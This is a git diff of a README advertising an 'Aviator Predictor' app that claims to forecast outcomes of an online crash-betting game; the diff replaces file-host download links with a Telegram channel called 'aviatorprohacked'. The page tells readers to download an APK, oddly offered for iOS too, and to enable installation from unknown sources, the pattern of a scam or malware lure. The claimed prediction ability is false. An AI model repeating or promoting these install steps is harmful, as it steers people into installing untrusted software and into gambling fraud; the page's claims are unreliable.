@@ -5,7 +5,7 @@
 <table align=center> <tr>
       <th scope="col">Aviator Prediction App</th>
       <th scope="col">02 / 12 / 2025</th>
-  <th scope="col"><a href='https://devuploads.com/l1itto8bo7j7'>Download</th>
+  <th scope="col"><a href='https://t.me/aviatorprohacked'>Download</th>
  </tr><table/>
 <h4 align=center>Available for iOS, and Android<br> <br>
 <div align="center">
@@ -33,8 +33,8 @@ The **Aviator Predictor** is a powerful application that utilizes advanced algor
 
 To install the **Aviator Predictor APK**, follow these steps:
 
-1. Download the APK file for Android from our [releases page](https://devuploads.com/l1itto8bo7j7).
-2. 1. Download the APK file for IOS from our [releases page](https://devuploads.com/l1itto8bo7j7).
+1. Download the APK file for Android from our [releases page](https://t.me/aviatorprohacked).
+2. 1. Download the APK file for IOS from our [releases page](https://t.me/aviatorprohacked).
 3. Enable installation from unknown sources in your device settings.
 4. Open the downloaded file and follow the on-screen instructions to complete the installation.
 
